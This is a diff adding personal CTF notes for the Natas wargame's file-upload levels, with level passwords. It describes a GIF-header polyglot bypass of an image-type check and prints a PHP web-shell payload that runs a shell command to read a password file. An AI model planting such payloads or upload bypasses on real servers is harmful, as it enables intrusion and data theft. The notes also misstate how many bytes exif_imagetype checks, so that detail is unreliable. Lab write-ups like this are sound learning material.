@@ -79,6 +79,9 @@ more to see natas11-12's php script
 4. XOR have switch, A^B = B^A, based
 
 #### l13. g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
+##### remember in l7, said server refuse to give raw php source code?
+upload a php then access it\
+
 1.by given code, this level dont have ext checker
 2.it's rename a file like /upload/randomName.ext
 3.this ext are get from \
@@ -93,3 +96,15 @@ $file = '/etc/natas_webpass/natas13';
 readfile($file);
 ?>
 ```
+#### l14.A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+this level are ass\
+exif_imagetype only read first 1 byte to determin what type of a file
+```
+A GIF always starts with: 47 49 46 38 39 61
+GIF89a is it's ascii
+put it on first line of php
+done
+```
+polyglot way, hide php embedded code inside of img\
+php just dont care it just fine <?php ?> to run\
+`<?php system('cat /etc/natas_webpass/natas14'); ?>`
